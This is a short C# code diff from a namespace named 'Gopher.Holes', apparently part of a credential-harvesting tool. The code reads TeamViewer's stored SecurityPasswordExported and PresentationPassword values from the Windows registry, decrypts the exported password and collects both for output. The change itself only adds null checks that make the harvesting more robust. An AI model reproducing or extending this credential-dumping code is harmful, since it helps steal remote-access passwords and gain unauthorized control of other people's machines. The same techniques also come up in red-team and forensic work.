@@ -87,22 +87,28 @@ namespace Gopher.Holes
 				else
 				{
 					subKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\TeamViewer\Temp");
-					exportedSecurityPassword = subKey.GetValue("SecurityPasswordExported");
 
-					if (exportedSecurityPassword != null)
-					{
-						settings.Add("Exported Password", Decrypt((byte[])exportedSecurityPassword));
-					}
+				    if (subKey != null)
+				    {
+				        exportedSecurityPassword = subKey.GetValue("SecurityPasswordExported");
+				        if (exportedSecurityPassword != null)
+				        {
+				            settings.Add("Exported Password", Decrypt((byte[])exportedSecurityPassword));
+				        }
+                    }
+
 				}
 
 				subKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\TeamViewer");
-				object presentationPassword = subKey.GetValue("PresentationPassword");
-
-				if (presentationPassword != null)
-				{
-					settings.Add("Presentation Password", presentationPassword.ToString());
-				}
-
+			    if (subKey != null)
+			    {
+			        object presentationPassword = subKey.GetValue("PresentationPassword");
+			        if (presentationPassword != null)
+			        {
+			            settings.Add("Presentation Password", presentationPassword.ToString());
+			        }
+                }
+				
 				if (settings.Count > 0)
 				{
 					int width = 0;
